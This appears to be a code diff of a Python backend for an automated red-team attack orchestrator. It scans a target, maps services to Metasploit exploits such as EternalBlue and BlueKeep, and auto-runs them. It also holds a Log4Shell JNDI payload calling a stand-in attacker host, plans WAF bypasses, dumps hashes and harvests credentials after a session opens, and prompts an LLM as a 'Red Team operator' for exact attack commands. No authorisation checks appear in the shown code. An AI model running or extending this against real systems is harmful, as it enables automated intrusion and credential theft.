+        "log4shell": {"tools": ["log4j-scan", "metasploit"], "cmd": "${{jndi:ldap://attacker:1389/a}}", "exploits": ["exploit/multi/http/log4shell_header_injection"], "severity": "critical", "next_action": "Deploy JNDI callback server, get shell"},
+        "eternalblue": {"tools": ["metasploit"], "cmd": "use exploit/windows/smb/ms17_010_eternalblue", "exploits": ["exploit/windows/smb/ms17_010_eternalblue"], "severity": "critical", "next_action": "Direct RCE, SYSTEM shell"},
     }
-    
+
     @classmethod
     def analyze_waf_detection(cls, waf_result: Dict) -> Dict[str, Any]:
-        """Analyze WAF detection and provide bypass strategies"""
         waf_name = waf_result.get("waf", "").lower() if waf_result.get("waf") else None
-        
         if not waf_name or waf_name == "none detected":
-            return {
-                "waf_detected": False,
-                "decision": "No WAF detected - proceed with standard attack methodology",
-                "strategy": None,
-                "risk_level": "low"
-            }
-        
-        # Find matching WAF strategy
+            return {"waf_detected": False, "decision": "No WAF detected - proceed with standard attack methodology", "strategy": None, "risk_level": "low"}
         strategy = None
         for key, strat in cls.WAF_BYPASS_STRATEGIES.items():
             if key in waf_name.lower():
                 strategy = strat
                 break
-        
         if not strategy:
             strategy = cls.WAF_BYPASS_STRATEGIES["default"]
-        
         return {
-            "waf_detected": True,
-            "waf_name": waf_name,
+            "waf_detected": True, "waf_name": waf_name,
             "decision": f"WAF DETECTED: {waf_name} - Adapting attack strategy",
-            "strategy": strategy,
-            "bypass_techniques": strategy["techniques"],
+            "strategy": strategy, "bypass_techniques": strategy["techniques"],
             "alternative_approach": strategy["alternative_approach"],
-            "risk_level": "high",
-            "recommendation": "Consider origin IP discovery before direct attacks"
+            "risk_level": "high", "recommendation": "Consider origin IP discovery before direct attacks"
         }
-    
+
     @classmethod
     def analyze_ports(cls, nmap_result: Dict) -> List[Dict[str, Any]]:
-        """Analyze open ports and recommend next actions"""
         decisions = []
-        ports = nmap_result.get("ports", [])
-        
-        for port_info in ports:
+        for port_info in nmap_result.get("ports", []):
             port = port_info.get("port", "")
             service = port_info.get("service", "").lower()
-            state = port_info.get("state", "")
-            
-            if state != "open":
+            if port_info.get("state") != "open":
                 continue
-            
-            # Find matching service strategy
             for svc_name, svc_strategy in cls.SERVICE_ATTACK_MAP.items():
                 if svc_name in service or port in svc_strategy:
                     decisions.append({
-                        "port": port,
-                        "service": service,
-                        "attack_strategy": svc_strategy,
+                        "port": port, "service": service, "attack_strategy": svc_strategy,
                         "decision": svc_strategy["decision"],
                         "recommended_tools": svc_strategy.get(port, svc_strategy.get(list(svc_strategy.keys())[0])),
-                        "exploits": svc_strategy["exploits"],
-                        "next_phase": svc_strategy["next_phase"]
+                        "exploits": svc_strategy["exploits"], "next_phase": svc_strategy["next_phase"]
                     })
                     break
-        
         return decisions
-    
+
     @classmethod
     def analyze_vulnerabilities(cls, vuln_results: Dict) -> List[Dict[str, Any]]:
-        """Analyze found vulnerabilities and recommend exploits"""
         decisions = []
-        vulns = vuln_results.get("vulnerabilities", [])
-        
-        for vuln in vulns:
+        for vuln in vuln_results.get("vulnerabilities", []):
             vuln_text = vuln.get("finding", str(vuln)).lower() if isinstance(vuln, dict) else str(vuln).lower()
-            
             for vuln_type, vuln_strategy in cls.VULN_EXPLOIT_MAP.items():
                 if vuln_type in vuln_text:
                     decisions.append({
-                        "vulnerability": vuln_type,
-                        "finding": vuln_text[:100],
-                        "severity": vuln_strategy["severity"],
-                        "tools": vuln_strategy["tools"],
-                        "command": vuln_strategy["cmd"],
-                        "exploits": vuln_strategy["exploits"],
+                        "vulnerability": vuln_type, "finding": vuln_text[:100],
+                        "severity": vuln_strategy["severity"], "tools": vuln_strategy["tools"],
+                        "command": vuln_strategy["cmd"], "exploits": vuln_strategy["exploits"],
                         "next_action": vuln_strategy["next_action"]
                     })
                     break
-        
         return decisions
-    
+
     @classmethod
     async def get_tactical_advice(cls, results: Dict, target: str, vault_context: Dict = None) -> Dict[str, Any]:
-        """Get real-time tactical advice with next_best_action for adaptive orchestration"""
         advice = {
-            "timestamp": datetime.now(timezone.utc).isoformat(),
-            "target": target,
-            "waf_analysis": None,
-            "port_decisions": [],
-            "vuln_decisions": [],
-            "kill_chain_update": [],
-            "priority_actions": [],
-            "overall_strategy": "",
-            "next_best_action": None,
-            "trigger_chain": None,
-            "skip_tools": [],
-            "add_tools": []
+            "timestamp": datetime.now(timezone.utc).isoformat(), "target": target,
+            "waf_analysis": None, "port_decisions": [], "vuln_decisions": [],
+            "kill_chain_update": [], "priority_actions": [], "overall_strategy": "",
+            "next_best_action": None, "trigger_chain": None, "skip_tools": [], "add_tools": []
         }
-        
         has_waf = False
-        waf_active = False
-        
-        # Analyze WAF
         if "wafw00f" in results or "waf" in results:
             waf_result = results.get("wafw00f", results.get("waf", {}))
             advice["waf_analysis"] = cls.analyze_waf_detection(waf_result)
-            
             if advice["waf_analysis"]["waf_detected"]:
                 has_waf = True
-                waf_active = advice["waf_analysis"]["waf_detected"]
-                advice["priority_actions"].append({
-                    "priority": 1,
-                    "action": "WAF Bypass Required",
-                    "details": advice["waf_analysis"]["alternative_approach"]
-                })
-                # Skip aggressive tools if WAF detected
+                advice["priority_actions"].append({"priority": 1, "action": "WAF Bypass Required", "details": advice["waf_analysis"]["alternative_approach"]})
                 advice["skip_tools"] = ["nikto", "sqlmap", "gobuster"]
-                advice["add_tools"] = ["subfinder"]  # Passive recon instead
-        
-        # Analyze ports
+                advice["add_tools"] = ["subfinder"]
         if "nmap" in results:
             advice["port_decisions"] = cls.analyze_ports(results["nmap"])
-            
             for decision in advice["port_decisions"]:
                 svc = decision["service"]
-                
-                # Add service-specific tools dynamically
                 if "smb" in svc or "445" in decision.get("port", ""):
                     advice["add_tools"].extend(["crackmapexec"])
-                    advice["priority_actions"].append({
-                        "priority": 1,
-                        "action": f"High-value: {svc} on {decision['port']}",
-                        "details": decision["decision"],
-                        "type": "exploit",
-                        "tool": "crackmapexec",
-                        "exploit": decision["exploits"][0] if decision["exploits"] else None,
-                        "port": decision["port"]
-                    })
+                    advice["priority_actions"].append({"priority": 1, "action": f"High-value: {svc} on {decision['port']}", "details": decision["decision"], "type": "exploit", "tool": "crackmapexec", "exploit": decision["exploits"][0] if decision["exploits"] else None, "port": decision["port"]})
                 elif "rdp" in svc or "3389" in decision.get("port", ""):
-                    advice["priority_actions"].append({
-                        "priority": 2,
-                        "action": f"RDP on {decision['port']}",
-                        "details": decision["decision"],
-                        "type": "exploit",
-                        "exploit": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
-                        "port": decision["port"]
-                    })
+                    advice["priority_actions"].append({"priority": 2, "action": f"RDP on {decision['port']}", "details": decision["decision"], "type": "exploit", "exploit": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce", "port": decision["port"]})
                 elif "ssh" in svc:
                     advice["add_tools"].extend(["hydra"])
                 elif ("http" in svc or "80" in decision.get("port", "")) and not has_waf:
                     advice["add_tools"].extend(["nikto", "gobuster"])
-        
-        # Analyze vulnerabilities  
         if "nikto" in results:
             advice["vuln_decisions"] = cls.analyze_vulnerabilities(results["nikto"])
-            
             for vuln in advice["vuln_decisions"]:
                 if vuln["severity"] == "critical":
-                    advice["priority_actions"].append({
-                        "priority": 1,
-                        "action": f"CRITICAL: {vuln['vulnerability']}",
-                        "details": vuln["next_action"],
-                        "type": "vuln_exploit",
-                        "tool": vuln["tools"][0] if vuln["tools"] else None,
-                        "exploit": vuln["exploits"][0] if vuln["exploits"] else None,
-                        "command": vuln["command"]
-                    })
-        
-        # Sort priority actions
+                    advice["priority_actions"].append({"priority": 1, "action": f"CRITICAL: {vuln['vulnerability']}", "details": vuln["next_action"], "type": "vuln_exploit", "tool": vuln["tools"][0] if vuln["tools"] else None, "exploit": vuln["exploits"][0] if vuln["exploits"] else None, "command": vuln["command"]})
         advice["priority_actions"].sort(key=lambda x: x["priority"])
-        
-        # Determine next_best_action
         vault = vault_context or {}
         has_session = bool(vault.get("sessions"))
         has_creds = bool(vault.get("credentials"))
-        
         if advice["priority_actions"]:
             top_action = advice["priority_actions"][0]
-            
-            # If critical vuln found AND we don't have a session yet -> exploit it
             if top_action.get("type") == "vuln_exploit" and top_action.get("exploit") and not has_session:
-                advice["next_best_action"] = {
-                    "action": "run_exploit",
-                    "module": top_action["exploit"],
-                    "target": target,
-                    "reason": f"Critical vulnerability: {top_action['action']}"
-                }
+                advice["next_best_action"] = {"action": "run_exploit", "module": top_action["exploit"], "target": target, "reason": f"Critical vulnerability: {top_action['action']}"}
             elif top_action.get("type") == "exploit" and top_action.get("exploit") and not has_session:
-                advice["next_best_action"] = {
-                    "action": "run_exploit",
-                    "module": top_action["exploit"],
-                    "target": target,
-                    "port": top_action.get("port"),
-                    "reason": top_action["action"]
-                }
+                advice["next_best_action"] = {"action": "run_exploit", "module": top_action["exploit"], "target": target, "port": top_action.get("port"), "reason": top_action["action"]}
             elif top_action.get("tool"):
-                advice["next_best_action"] = {
-                    "action": "run_tool",
-                    "tool": top_action["tool"],
-                    "target": target,
-                    "reason": top_action["action"]
-                }
-        
-        # If we have session but no creds -> prioritize credential harvesting
+                advice["next_best_action"] = {"action": "run_tool", "tool": top_action["tool"], "target": target, "reason": top_action["action"]}
         if has_session and not has_creds:
-            advice["next_best_action"] = {
-                "action": "post_exploit",
-                "module": "post/windows/gather/hashdump" if vault.get("os_info", {}).get("os") == "windows" else None,
-                "reason": "Session active - harvest credentials"
-            }
-        
-        # Check if we should auto-trigger an attack chain
+            advice["next_best_action"] = {"action": "post_exploit", "module": "post/windows/gather/hashdump" if vault.get("os_info", {}).get("os") == "windows" else None, "reason": "Session active - harvest credentials"}
         results_text = json.dumps(results).lower()
         chain_triggers = {
             "web_to_shell": ["sql injection", "command injection", "rce", "file upload"],
@@ -762,20 +430,12 @@ class TacticalDecisionEngine:
             "linux_privesc": ["shell", "ssh"],
             "windows_privesc": ["rdp", "winrm", "smb"],
         }
-        
         for chain_id, triggers in chain_triggers.items():
             match_count = sum(1 for t in triggers if t in results_text)
             if match_count >= 2 and not has_session:
                 matched = [t for t in triggers if t in results_text]
-                advice["trigger_chain"] = {
-                    "chain_id": chain_id,
-                    "triggers_matched": matched,
-                    "confidence": min(match_count / len(triggers), 1.0),
-                    "reason": f"Multiple indicators match: {', '.join(matched)}"
-                }
+                advice["trigger_chain"] = {"chain_id": chain_id, "triggers_matched": matched, "confidence": min(match_count / len(triggers), 1.0), "reason": f"Multiple indicators match: {', '.join(matched)}"}
                 break
-        
-        # Generate overall strategy
         if has_waf:
             advice["overall_strategy"] = f"WAF detected ({advice['waf_analysis']['waf_name']}). Indirect approach: skip aggressive tools, find origin IP."
         elif has_session:
@@ -784,33 +444,16 @@ class TacticalDecisionEngine:
             advice["overall_strategy"] = f"Direct attack viable. Priority: {advice['priority_actions'][0]['action']}"
         else:
             advice["overall_strategy"] = "Continue reconnaissance. No immediate high-value targets."
-        
         return advice
 
 
 # =============================================================================
-# MITRE ATT&CK TACTICS & TECHNIQUES DATABASE
+# MITRE ATT&CK TACTICS & RED TEAM TOOLS
 # =============================================================================
 MITRE_TACTICS = {
-    "reconnaissance": {
-        "id": "TA0043", "name": "Reconnaissance", "description": "Gathering information",
-        "techniques": [
-            {"id": "T1595", "name": "Active Scanning", "tools": ["nmap", "masscan"]},
-            {"id": "T1592", "name": "Gather Victim Host Info", "tools": ["whatweb"]},
-            {"id": "T1590", "name": "Gather Victim Network Info", "tools": ["subfinder", "amass"]},
-        ]
-    },
-    "resource_development": {
-        "id": "TA0042", "name": "Resource Development", "description": "Establishing resources",
-        "techniques": [{"id": "T1587", "name": "Develop Capabilities", "tools": ["msfvenom"]}]
-    },
-    "initial_access": {
-        "id": "TA0001", "name": "Initial Access", "description": "Gaining foothold",
-        "techniques": [
-            {"id": "T1190", "name": "Exploit Public-Facing App", "tools": ["nikto", "sqlmap"]},
-            {"id": "T1133", "name": "External Remote Services", "tools": ["hydra"]},
-        ]
-    },
+    "reconnaissance": {"id": "TA0043", "name": "Reconnaissance", "description": "Gathering information", "techniques": [{"id": "T1595", "name": "Active Scanning", "tools": ["nmap", "masscan"]}, {"id": "T1592", "name": "Gather Victim Host Info", "tools": ["whatweb"]}, {"id": "T1590", "name": "Gather Victim Network Info", "tools": ["subfinder", "amass"]}]},
+    "resource_development": {"id": "TA0042", "name": "Resource Development", "description": "Establishing resources", "techniques": [{"id": "T1587", "name": "Develop Capabilities", "tools": ["msfvenom"]}]},
+    "initial_access": {"id": "TA0001", "name": "Initial Access", "description": "Gaining foothold", "techniques": [{"id": "T1190", "name": "Exploit Public-Facing App", "tools": ["nikto", "sqlmap"]}, {"id": "T1133", "name": "External Remote Services", "tools": ["hydra"]}]},
     "execution": {"id": "TA0002", "name": "Execution", "description": "Running code", "techniques": []},
     "persistence": {"id": "TA0003", "name": "Persistence", "description": "Maintaining access", "techniques": []},
     "privilege_escalation": {"id": "TA0004", "name": "Privilege Escalation", "description": "Higher permissions", "techniques": []},
@@ -824,9 +467,6 @@ MITRE_TACTICS = {
     "impact": {"id": "TA0040", "name": "Impact", "description": "Disrupt/destroy", "techniques": []},
 }
 
-# =============================================================================
-# RED TEAM TOOLS DATABASE
-# =============================================================================
 RED_TEAM_TOOLS = {
     "nmap": {"phase": "reconnaissance", "mitre": "T1595", "cmd": "nmap -sV -sC -A {target}", "desc": "Port scanner"},
     "masscan": {"phase": "reconnaissance", "mitre": "T1595", "cmd": "masscan -p1-65535 {target} --rate=1000", "desc": "Fast scanner"},
@@ -840,9 +480,6 @@ RED_TEAM_TOOLS = {
     "crackmapexec": {"phase": "initial_access", "mitre": "T1078", "cmd": "crackmapexec smb {target}", "desc": "SMB/AD pentesting"},
 }
 
-# =============================================================================
-# METASPLOIT MODULES
-# =============================================================================
 METASPLOIT_MODULES = [
     {"name": "exploit/multi/http/apache_mod_cgi_bash_env_exec", "desc": "Shellshock", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
     {"name": "exploit/multi/http/log4shell_header_injection", "desc": "Log4Shell", "rank": "excellent", "category": "exploit", "mitre": "T1190"},
@@ -856,6 +493,7 @@ METASPLOIT_MODULES = [
     {"name": "post/windows/gather/hashdump", "desc": "Hash Dump", "rank": "normal", "category": "post", "mitre": "T1003"},
     {"name": "post/multi/recon/local_exploit_suggester", "desc": "Exploit Suggester", "rank": "normal", "category": "post", "mitre": "T1068"},
 ]
+
 
 # =============================================================================
 # MODELS
@@ -878,6 +516,14 @@ class ExploitExecute(BaseModel):
 class UpdateNodeStatus(BaseModel):
     status: str
     notes: Optional[str] = None
+
+class ChainExecutionRequest(BaseModel):
+    scan_id: str
+    chain_id: str
+    target: str
+    context: Dict[str, str] = {}
+    auto_execute: bool = False
+
 
 # =============================================================================
 # HELPER FUNCTIONS
@@ -917,12 +563,10 @@ async def run_tool(tool_id: str, target: str) -> Dict[str, Any]:
     tool = RED_TEAM_TOOLS.get(tool_id)
     if not tool:
         return {"error": f"Unknown tool: {tool_id}"}
-    
     try:
         cmd = tool["cmd"].format(target=target)
         result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=300)
         output = result.stdout + result.stderr
-        
         if tool_id == "nmap":
             return parse_nmap_output(output)
         elif tool_id == "wafw00f":
@@ -946,7 +590,6 @@ async def run_metasploit(module: str, target: str, port: Optional[int], options:
     if effective_lport:
         rc_content += f"set LPORT {effective_lport}\n"
     rc_content += "run\nexit\n"
-    
     try:
         rc_file = f"/tmp/msf_{uuid.uuid4().hex[:8]}.rc"
         with open(rc_file, 'w') as f:
@@ -962,39 +605,31 @@ async def run_metasploit(module: str, target: str, port: Optional[int], options:
         return {"error": str(e)}
 
 async def get_tactical_ai_advice(results: Dict, target: str, tactical_analysis: Dict) -> Dict[str, Any]:
-    """Get AI advice with tactical context"""
     if not KIMI_API_KEY:
         return {"analysis": "API key not configured", "exploits": []}
-    
-    prompt = f"""Eres un Red Team Operator experto. Analiza estos resultados y el análisis táctico para {target}:
+    prompt = f"""Eres un Red Team Operator experto. Analiza estos resultados y el analisis tactico para {target}:
 
 RESULTADOS DEL ESCANEO:
 {json.dumps(results, indent=2, default=str)[:3000]}
 
-ANÁLISIS TÁCTICO AUTOMÁTICO:
+ANALISIS TACTICO AUTOMATICO:
 {json.dumps(tactical_analysis, indent=2, default=str)}
 
-Basándote en el análisis táctico, proporciona:
+Basandote en el analisis tactico, proporciona:
+1. VALIDACION DEL ANALISIS TACTICO
+2. AJUSTES AL PLAN
+3. SECUENCIA DE ATAQUE OPTIMA
+4. COMANDOS ESPECIFICOS
+5. CONTINGENCIAS
 
-1. **VALIDACIÓN DEL ANÁLISIS TÁCTICO**: ¿El motor de decisión identificó correctamente los vectores?
-
-2. **AJUSTES AL PLAN**: Si se detectó WAF, ¿qué técnicas adicionales de bypass recomiendas?
-
-3. **SECUENCIA DE ATAQUE ÓPTIMA**: Ordena las acciones por probabilidad de éxito
-
-4. **COMANDOS ESPECÍFICOS**: Para cada vector identificado, dame el comando exacto
-
-5. **CONTINGENCIAS**: Si el plan principal falla, ¿cuál es el plan B?
-
-Responde en español, sé conciso y táctico."""
-
+Responde en espanol, se conciso y tactico."""
     try:
         async with httpx.AsyncClient(timeout=90.0) as http:
             response = await http.post(
                 KIMI_API_URL,
                 headers={"Authorization": f"Bearer {KIMI_API_KEY}", "Content-Type": "application/json"},
                 json={"model": "kimi-k2-0711-preview", "messages": [
-                    {"role": "system", "content": "Eres un Red Team operator. Sé táctico y directo."},
+                    {"role": "system", "content": "Eres un Red Team operator. Se tactico y directo."},
                     {"role": "user", "content": prompt}
                 ], "temperature": 0.3, "max_tokens": 4000}
             )
@@ -1017,27 +652,20 @@ def build_attack_tree(scan_id: str, target: str, results: Dict, phases: List[str
     tree = {
         "scan_id": scan_id,
         "root": {"id": "root", "type": "target", "name": target, "description": f"Target: {target}", "status": "testing", "children": []},
-        "nodes": {},
-        "tactical_decisions": tactical
+        "nodes": {}, "tactical_decisions": tactical
     }
-    
     node_id = 0
-    
-    # Add tactical decisions as priority nodes
     if (tactical.get("waf_analysis") or {}).get("waf_detected"):
         node_id += 1
         waf_node_id = f"waf_{node_id}"
         tree["nodes"][waf_node_id] = {
             "id": waf_node_id, "parent_id": "root", "type": "defense",
-            "name": f"⚠️ WAF: {tactical['waf_analysis']['waf_name']}",
+            "name": f"WAF: {tactical['waf_analysis']['waf_name']}",
             "description": tactical['waf_analysis']['alternative_approach'],
             "status": "pending", "severity": "high",
-            "data": {"bypass_techniques": tactical['waf_analysis']['bypass_techniques']},
-            "children": []
+            "data": {"bypass_techniques": tactical['waf_analysis']['bypass_techniques']}, "children": []
         }
         tree["root"]["children"].append(waf_node_id)
-        
-        # Add bypass techniques
         for tech in tactical['waf_analysis']['bypass_techniques']:
             node_id += 1
             tech_id = f"bypass_{node_id}"
@@ -1048,74 +676,65 @@ def build_attack_tree(scan_id: str, target: str, results: Dict, phases: List[str
                 "data": {"tools": tech['tools']}, "children": []
             }
             tree["nodes"][waf_node_id]["children"].append(tech_id)
-    
-    # Add priority actions
     for action in tactical.get("priority_actions", []):
         node_id += 1
         action_id = f"priority_{node_id}"
         tree["nodes"][action_id] = {
             "id": action_id, "parent_id": "root", "type": "priority",
-            "name": f"🎯 P{action['priority']}: {action['action']}",
+            "name": f"P{action['priority']}: {action['action']}",
             "description": action['details'],
             "status": "pending", "severity": "critical" if action['priority'] == 1 else "high",
             "data": action, "children": []
         }
         tree["root"]["children"].append(action_id)
-    
-    # Add tool results
-    for tool_id, result in results.items():
-        tool_info = RED_TEAM_TOOLS.get(tool_id, {})
+    for tool_id_key, result in results.items():
+        tool_info = RED_TEAM_TOOLS.get(tool_id_key, {})
         node_id += 1
         tool_node_id = f"tool_{node_id}"
         tree["nodes"][tool_node_id] = {
             "id": tool_node_id, "parent_id": "root", "type": "tool",
-            "name": f"{tool_id.upper()}", "description": tool_info.get('desc', ''),
+            "name": f"{tool_id_key.upper()}", "description": tool_info.get('desc', ''),
             "status": "completed" if not result.get("error") else "failed",
             "severity": "info", "mitre": tool_info.get('mitre'),
             "data": result, "children": []
         }
         tree["root"]["children"].append(tool_node_id)
-    
-    # Add AI exploits
     for exploit in ai_data.get("exploits", []):
         node_id += 1
         exp_id = f"exploit_{node_id}"
         tree["nodes"][exp_id] = {
             "id": exp_id, "parent_id": "root", "type": "exploit",
             "name": exploit.get("module", "Exploit"), "description": "",
-            "status": "pending", "severity": "critical",
-            "data": exploit, "children": []
+            "status": "pending", "severity": "critical", "data": exploit, "children": []
         }
         tree["root"]["children"].append(exp_id)
-    
     return tree
 
+
+# =============================================================================
+# MODULES
+# =============================================================================
 from modules.credential_vault import CredentialVault
 from modules.session_manager import SessionManager
 
-# Global instances
 credential_vault = CredentialVault()
 session_manager = SessionManager()
 
-# Global operator config (persisted in MongoDB)
+
+# =============================================================================
+# GLOBAL CONFIG (SQLite-backed)
+# =============================================================================
 global_config: Dict[str, Any] = {
-    "listener_ip": "",
-    "listener_port": 4444,
-    "c2_protocol": "tcp",
-    "operator_name": "operator",
-    "stealth_mode": False,
-    "auto_lhost": True,  # Auto-inject LHOST into all payloads
+    "listener_ip": "", "listener_port": 4444, "c2_protocol": "tcp",
+    "operator_name": "operator", "stealth_mode": False, "auto_lhost": True,
 }
 
 async def load_global_config():
-    """Load global config from DB on startup, seed from env vars if empty"""
     global global_config
-    doc = await db.global_config.find_one({"_id": "operator_config"})
-    if doc:
-        doc.pop("_id", None)
-        global_config.update(doc)
-
-    # Seed from env vars if not yet configured in DB
+    stored = await repo.config_get("operator_config")
+    if stored and isinstance(stored, dict):
+        global_config.update(stored)
+    # Seed from env vars if not yet configured
     env_ip = os.environ.get("LISTENER_IP", "")
     env_port = os.environ.get("LISTENER_PORT", "")
     changed = False
@@ -1126,129 +745,117 @@ async def load_global_config():
         global_config["listener_port"] = int(env_port)
         changed = True
     if changed:
-        await db.global_config.update_one(
-            {"_id": "operator_config"}, {"$set": global_config}, upsert=True
-        )
+        await repo.config_set("operator_config", global_config)
 
 def get_effective_lhost() -> str:
-    """Get the effective LHOST from global config"""
     return global_config.get("listener_ip", "") or ""
 
-# Adaptive scan config
+
+# =============================================================================
+# SCAN LIMITS & BACKGROUND HANDLER
+# =============================================================================
 SCAN_LIMITS = {
-    "max_tools": 20,
-    "max_time_seconds": 600,
-    "tool_timeout": 120,
-    "pause_between_tools": 1,
-    "max_consecutive_errors": 3,
+    "max_tools": 20, "max_time_seconds": 600, "tool_timeout": 120,
+    "pause_between_tools": 1, "max_consecutive_errors": 3,
     "aggressive_tools": ["nikto", "sqlmap", "hydra", "gobuster"],
     "stealth_tools": ["nmap", "wafw00f", "whatweb", "subfinder", "masscan"],
 }
 
-async def run_scan_background(scan_id: str, target: str, phases: List[str], tools: List[str]):
-    """ADAPTIVE ORCHESTRATION - Each tool result decides what runs next"""
-    global scan_progress, attack_trees
-    
-    import time
+
+async def scan_job_handler(job_id: str, target: str, params: Dict):
+    """Adaptive scan orchestration — runs as an async Job."""
+    phases = params.get("phases", ["reconnaissance", "initial_access"])
+    tools_requested = params.get("tools", [])
+    scan_id = params.get("scan_id", job_id)
     start_time = time.time()
-    
+
     scan_progress[scan_id] = {
         "status": "running", "current_tool": None, "progress": 0,
         "results": {}, "tactical_decisions": [], "ai_analysis": None,
         "timeline": [], "vault_summary": {}, "adaptive_log": []
     }
-    
-    # Initialize vault context - use global LHOST
+
     effective_lhost = get_effective_lhost()
     credential_vault.update_context(scan_id, target=target, lhost=effective_lhost)
-    
-    # Phase 1: Build initial tool queue from phases
-    initial_tools = tools or [t for t, info in RED_TEAM_TOOLS.items() if info["phase"] in phases]
-    
-    # Prioritize: recon tools first, then aggressive
+
+    initial_tools = tools_requested or [t for t, info in RED_TEAM_TOOLS.items() if info["phase"] in phases]
     recon_first = [t for t in initial_tools if t in SCAN_LIMITS["stealth_tools"]]
     aggressive_later = [t for t in initial_tools if t not in SCAN_LIMITS["stealth_tools"]]
     tool_queue = recon_first + aggressive_later
-    
+
     executed_tools = set()
     consecutive_errors = 0
     tool_count = 0
-    
-    def log_timeline(event_type: str, detail: str, data: Dict = None):
+
+    def log_timeline(event_type, detail, data=None):
         scan_progress[scan_id]["timeline"].append({
             "time": datetime.now(timezone.utc).isoformat(),
             "elapsed": round(time.time() - start_time, 1),
-            "type": event_type,
-            "detail": detail,
-            "data": data or {}
+            "type": event_type, "detail": detail, "data": data or {}
         })
-    
-    def log_adaptive(decision: str, reason: str):
+
+    def log_adaptive(decision, reason):
         scan_progress[scan_id]["adaptive_log"].append({
             "time": datetime.now(timezone.utc).isoformat(),
-            "decision": decision,
-            "reason": reason
+            "decision": decision, "reason": reason
         })
-    
+
     try:
         log_timeline("start", f"Adaptive scan initiated for {target}", {"phases": phases})
-        
-        # ===== ADAPTIVE LOOP =====
+        await repo.job_log(job_id, "info", f"Scan started: {target}", module="scan")
+
+        # Create scan record in SQLite
+        await repo.scan_create(scan_id, job_id, target, phases, list(tool_queue))
+
         while tool_queue and tool_count < SCAN_LIMITS["max_tools"]:
-            # Check time limit
             elapsed = time.time() - start_time
             if elapsed > SCAN_LIMITS["max_time_seconds"]:
                 log_adaptive("TIMEOUT", f"Time limit reached ({int(elapsed)}s)")
                 break
-            
-            # Check error limit
             if consecutive_errors >= SCAN_LIMITS["max_consecutive_errors"]:
                 log_adaptive("ERROR_LIMIT", f"{consecutive_errors} consecutive errors")
                 break
-            
-            # Check for abort
             if scan_progress.get(scan_id, {}).get("status") == "aborted":
                 log_adaptive("ABORTED", "User aborted scan")
                 break
-            
-            # Pick next tool
+
             tool_id = tool_queue.pop(0)
-            
-            # Skip if already executed
             if tool_id in executed_tools:
                 continue
-            
-            # Skip aggressive tools if WAF detected
+
             waf_detected = any(
-                (td.get("advice") or {}).get("waf_analysis") is not None and (td.get("advice") or {}).get("waf_analysis", {}).get("waf_detected", False)
+                (td.get("advice") or {}).get("waf_analysis") is not None
+                and (td.get("advice") or {}).get("waf_analysis", {}).get("waf_detected", False)
                 for td in scan_progress[scan_id]["tactical_decisions"]
             )
             if waf_detected and tool_id in SCAN_LIMITS["aggressive_tools"]:
                 log_adaptive("SKIP", f"Skipping {tool_id} - WAF active")
                 log_timeline("skip", f"Skipped {tool_id} due to WAF", {"reason": "waf_active"})
                 continue
-            
-            # Execute tool
+
             scan_progress[scan_id]["current_tool"] = tool_id
             total_estimate = max(len(tool_queue) + len(executed_tools) + 3, 5)
-            scan_progress[scan_id]["progress"] = int((len(executed_tools) / total_estimate) * 80)
-            
+            progress = int((len(executed_tools) / total_estimate) * 80)
+            scan_progress[scan_id]["progress"] = progress
+            await repo.job_update(job_id, progress=progress, current_step=tool_id)
+
             log_timeline("tool_start", f"Executing {tool_id}")
-            
+            await repo.job_log(job_id, "info", f"Running: {tool_id}", module="scan")
+
             result = await run_tool(tool_id, target)
             scan_progress[scan_id]["results"][tool_id] = result
             executed_tools.add(tool_id)
             tool_count += 1
-            
-            # Check for errors
+
             if result.get("error"):
                 consecutive_errors += 1
                 log_timeline("tool_error", f"{tool_id} failed: {result['error']}")
+                await repo.job_log(job_id, "error", f"{tool_id} failed: {result['error']}", module="scan")
             else:
                 consecutive_errors = 0
                 log_timeline("tool_complete", f"{tool_id} completed")
-            
-            # Parse credentials from output
+
+            # Parse credentials
             output_text = ""
             if isinstance(result, dict):
                 output_text = result.get("output", result.get("raw", ""))
@@ -1257,67 +864,52 @@ async def run_scan_background(scan_id: str, target: str, phases: List[str], tool
                 for cred in found_creds:
                     credential_vault.add_credential(scan_id, cred)
                     log_timeline("credential", f"Found: {cred.get('type')} - {cred.get('username','?')}", cred)
-                
-                # Detect OS
                 os_info = CredentialVault.detect_os_from_output(output_text)
                 if os_info:
                     credential_vault.update_context(scan_id, os_info=os_info)
-            
-            # Check for session indicators
+
+            # Session detection
             result_str = json.dumps(result) if isinstance(result, dict) else str(result)
             if (isinstance(result, dict) and result.get("session_opened")) or ("session" in result_str.lower() and "opened" in result_str.lower()):
-                os_detected = credential_vault.get_context(scan_id).get("os_info", {}).get("os", "unknown") if credential_vault.get_context(scan_id) else "unknown"
+                os_detected = (credential_vault.get_context(scan_id) or {}).get("os_info", {}).get("os", "unknown")
                 session_manager.register(scan_id, {"id": f"s_{tool_count}", "host": target, "type": "shell", "source": tool_id, "platform": os_detected})
                 log_timeline("session", f"Session opened via {tool_id}", {"host": target})
-            
-            # ===== TACTICAL DECISION - THE CORE OF ADAPTIVE ORCHESTRATION =====
+
+            # Tactical decision
             vault_ctx = credential_vault.get_context(scan_id)
             tactical = await TacticalDecisionEngine.get_tactical_advice(scan_progress[scan_id]["results"], target, vault_ctx)
-            
-            scan_progress[scan_id]["tactical_decisions"].append({
-                "after_tool": tool_id,
-                "advice": tactical
-            })
-            
-            # Process tactical decisions
-            # 1. Remove skipped tools from queue
+            scan_progress[scan_id]["tactical_decisions"].append({"after_tool": tool_id, "advice": tactical})
+
             for skip_tool in tactical.get("skip_tools", []):
                 if skip_tool in tool_queue:
                     tool_queue.remove(skip_tool)
-                    log_adaptive("REMOVE", f"Removed {skip_tool} from queue ({tactical.get('overall_strategy','')})")
-            
-            # 2. Add dynamically suggested tools
+                    log_adaptive("REMOVE", f"Removed {skip_tool} from queue")
+
             for add_tool in tactical.get("add_tools", []):
                 if add_tool not in executed_tools and add_tool not in tool_queue and add_tool in RED_TEAM_TOOLS:
-                    tool_queue.insert(0, add_tool)  # Priority insertion
+                    tool_queue.insert(0, add_tool)
                     log_adaptive("ADD", f"Added {add_tool} to queue")
-            
-            # 3. Handle next_best_action
+
             nba = tactical.get("next_best_action")
             if nba:
                 if nba["action"] == "run_exploit" and nba.get("module"):
-                    log_adaptive("EXPLOIT", f"Auto-running exploit: {nba['module']} ({nba.get('reason','')})")
